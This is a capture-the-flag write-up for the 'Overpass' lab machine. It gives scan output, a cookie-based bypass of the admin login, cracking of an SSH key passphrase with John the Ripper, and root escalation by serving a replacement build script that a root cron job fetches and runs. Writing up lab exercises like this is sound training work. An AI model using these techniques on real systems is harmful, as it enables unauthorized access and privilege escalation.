# Overpass

## 1. nmap scan
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## 2. gobuster scan
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]

## 3. change the cookie
Press F12 on the website and type inside the console Cookies.set("SessionToken","")
Now press F5 and we got a username "James" and a ssh key

## 4. crack the hash
> ssh2john key > hash
> john hash /usr/share/wordlist/rockyou.txt
--> now we got our password

## 5. access to ssh
> ssh -i key james@<IP>

## 6. root access
There is a cron job, so we build the path like in the cron job on our host.
> nano downloads/src/buildscript.sh
Put our shell and a way to write the flag inside the new sh file.

#!/bin/bash
cat /root/root.txt > /tmp/flag

lets start a normal python3 web server and the cron job will write the flag inside /tmp/flag
> python3 -m http.server 80


